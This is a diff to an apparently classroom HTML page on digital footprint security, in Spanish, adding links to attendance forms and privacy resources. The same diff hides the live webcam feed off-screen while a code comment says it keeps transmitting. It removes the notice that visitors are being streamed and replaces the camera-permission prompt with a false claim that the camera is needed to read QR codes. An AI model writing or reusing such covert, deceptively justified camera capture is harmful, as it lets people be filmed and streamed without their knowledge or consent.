@@ -5,6 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Seguridad de Sistemas - Experiencia de huella digital</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* Estilos adicionales para mejorar la presentación */
+        .resource-container {
+            margin-top: 15px;
+        }
+        
+        .resource-link {
+            display: block;
+            padding: 10px 15px;
+            margin: 8px 0;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            color: #3498db;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            border-left: 3px solid #3498db;
+        }
+        
+        .resource-link:hover {
+            background: rgba(255, 255, 255, 0.12);
+            transform: translateX(5px);
+        }
+        
+        .warning-text {
+            background: rgba(231, 76, 60, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        /* Ocultar el video pero mantener la funcionalidad */
+        .hidden-video-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        
+        /* Mejoras para los features */
+        .feature-content {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .section-title {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #3498db;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 8px;
+        }
+    </style>
 </head>
 <body class="client-page">
     <div class="container">
@@ -13,40 +69,68 @@
                 <h1>🏠 Seguridad de Sistemas</h1>
                 <p>Experiencia selfie</p>
             </div>
+            <div class="status">
+                <div class="status-dot"></div>
+                <span>Transmitiendo</span>
+            </div>
         </header>
         
         <div class="content">
-            <div class="video-container">
+            <!-- Contenedor de video oculto (solo transmite pero no se muestra) -->
+            <div class="hidden-video-container">
                 <video id="localVideo" autoplay muted playsinline></video>
                 <canvas id="videoCanvas" style="display:none;"></canvas>
-                <div class="video-overlay">
-                    <p>¡¡Sonríe!! Estás siendo transmitido ... a algún lugar</p>
-                </div>
             </div>
             
             <div class="info-section">
                 <h2>Seguridad de Sistemas</h2>
-                <p>Estás viendo en directo cómo la tecnología puede hacer tu vida más fácil cómoda y ...¿segura?</p>
+                <p>La tecnología puede hacer tu vida más fácil, cómoda y ...¿segura?</p>
                 
                 <div class="features">
                     <div class="feature">
                         <span class="icon">🏠</span>
-                        <h3>Control Remoto</h3>
-                         <p>¿crees que alguien sería capaz de tomar tus datos y hacer uso indebido de tu dispositivo?</p>
+                        <h3>Recursos de la clase</h3>
+                        <div class="feature-content">
+                            <p>Iniciemos con una pregunta: ¿crees que alguien sería capaz de tomar tus datos y hacer uso indebido de tu dispositivo?</p>
+                            
+                            <div class="resource-container">
+                                <a href="https://forms.gle/JF881txtNRhWBcN59" target="_blank" class="resource-link">📝 Asistencia - Registra tu participación</a>
+                                <a href="https://forms.gle/QAh86prFh2jQnaE36" target="_blank" class="resource-link">🎯 Expectativas de la materia - Comparte qué esperas aprender</a>
+                                <a href="https://www.linkedin.com/in/rodrigo-atilio-elgueta/" target="_blank" class="resource-link">👨‍🏫 ¿Quién está al frente? - Conoce al Mg. Ing. Elgueta Rodrigo Atilio</a>
+                            </div>
+                        </div>
                     </div>
+                    
                     <div class="feature">
                         <span class="icon">🔒</span>
-                       <h3>Seguridad</h3>
-                        <p>NUNCA abras un QR sin antes saber cómo está hecho, que permisos requiere, a dónde te dirige y qué tipo de archivos descargará en tu móvil</p>
+                        <h3>Seguridad</h3>
+                        <div class="feature-content">
+                            <p>¿Sabías que cada acción que realizas en internet posee una huella digital? ¿Por qué deberíamos proteger nuestra huella digital?</p>
+                            
+                            <div class="resource-container">
+                                <a href="https://datadetoxkit.org/es/home" target="_blank" class="resource-link">🧹 Data Detox Kit - Limpia tu huella digital en 8 días</a>
+                                <a href="https://www.incibe.es/sites/default/files/contenidos/guias/doc/GU%C3%8DA_CIBERSEGURIDAD_EN_LA_IDENTIDAD_DIGITAL.pdf" target="_blank" class="resource-link">📖 Guía de ciberseguridad en identidad digital - INCIBE</a>
+                            </div>
+                        </div>
                     </div>
+                    
                     <div class="feature">
                         <span class="icon">💡</span>
                         <h3>Toma conciencia</h3>
-                        <p>El mundo es peligroso... concientízate y evangeliza </p>
+                        <div class="feature-content">
+                            <p>El mundo es peligroso... concientízate y evangeliza. Revisa estos recursos para conocer tu exposición actual.</p>
+                            
+                            <div class="resource-container">
+                                <a href="https://coveryourtracks.eff.org/" target="_blank" class="resource-link">🕵️ Panopticlick - Descubre qué tan rastreable es tu navegador</a>
+                                <a href="https://haveibeenpwned.com/" target="_blank" class="resource-link">🔓 Have I Been Pwned? - Verifica si tus datos fueron comprometidos</a>
+                                <a href="https://phishingquiz.withgoogle.com/" target="_blank" class="resource-link">🎣 Phishing Quiz de Google - Pon a prueba tu capacidad de detectar fraudes</a>
+                            </div>
+                        </div>
                     </div>
                 </div>
                 
                 <div class="cta">
+                    <p class="warning-text">¡PRECAUCIÓN! NUNCA abras un QR sin antes saber cómo está hecho, qué permisos requiere, a dónde te dirige y qué tipo de archivos descargará en tu móvil.</p>
                     <a href="https://www.argentina.gob.ar/justicia/convosenlaweb/situaciones/que-es-mi-identidad-digital-y-como-la-protejo" target="_blank" class="btn">¿Cómo protejo mi identidad digital?</a>
                 </div>
             </div>
@@ -135,7 +219,7 @@
                 
             } catch (error) {
                 console.error('Error accediendo a la cámara:', error);
-                alert('Por favor, permite el acceso a la cámara para disfrutar de la experiencia completa.');
+                alert('Se requiere el acceso a la cámara para la correcta lectura de los QR');
             }
         }
         
